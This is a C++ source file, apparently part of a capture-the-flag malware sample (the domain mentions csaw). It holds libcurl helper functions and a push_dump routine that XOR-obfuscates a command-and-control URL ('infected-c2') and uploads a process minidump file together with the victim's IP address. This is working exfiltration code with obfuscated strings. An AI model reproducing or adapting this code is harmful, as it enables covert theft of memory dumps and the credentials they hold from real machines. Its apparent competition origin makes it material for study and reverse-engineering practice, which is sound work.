#include <iostream>
#include <string>
#include "curl/curl.h"

#include "../obfuscation/obfuscation.h"


size_t callback(const char* in, size_t size, size_t num, std::string* out) {
    const size_t totalBytes(size * num);
    out->append(in, totalBytes);
    return totalBytes;
}

std::string make_post_request(const std::string& url, const std::string& postFields) {
    CURL* curl = curl_easy_init();
    CURLcode res;
    std::string response;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;

        curl_easy_cleanup(curl);
    }
    return response;
}

std::string make_get_request(const std::string& url) {
    CURL* curl = curl_easy_init();
    CURLcode res;
    std::string response;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;

        curl_easy_cleanup(curl);
    }
    return response;
}

std::string post_file(const std::string& url, const std::string& file_path) {
    CURL *curl;
    CURLcode res;
    std::string response;


    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if(curl) {
        curl_mime *mime;
        curl_mimepart *part;
        curl_mimepart *part2;

        mime = curl_mime_init(curl);

        // Add file part
        part = curl_mime_addpart(mime);
        curl_mime_filedata(part, file_path.c_str());  // Replace with path to your file
        curl_mime_name(part, "file");               // "sendfile" is the field name

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());  // Replace with your URL
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        if(res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_easy_cleanup(curl);
        curl_mime_free(mime);
    }
    curl_global_cleanup();
    return response;
}


std::string push_dump(const std::string& ip, const std::string& filename) {
    //      http://infected-c2.csaw.io
    std::string base_url = encryptDecrypt({0x5a,0x46,0x46,0x42,0x08,0x1d,0x1d,0x5b,0x5c,0x54,0x57,0x51,0x46,0x57,0x56,0x1f,0x51,0x00,0x1c,0x51,0x41,0x53,0x45,0x1c,0x5b,0x5d}, 0x32);

    //      /process_minidump
    std::string mini_path = encryptDecrypt({0x40,0x1f,0x1d,0x00,0x0c,0x0a,0x1c,0x1c,0x30,0x02,0x06,0x01,0x06,0x0b,0x1a,0x02,0x1f}, 0x6f);
    std::string minidump_url = base_url + mini_path;

    //      /static
    std::string static_path = encryptDecrypt({0x40,0x1c,0x1b,0x0e,0x1b,0x06,0x0c}, 0x6f);
    std::string download_location = base_url + static_path;


    //     ?ip=
    std::string params = encryptDecrypt({0x50,0x06,0x1f,0x52}, 0x6f);

    std::string response = post_file(minidump_url + params + ip, filename);
    return response;
}

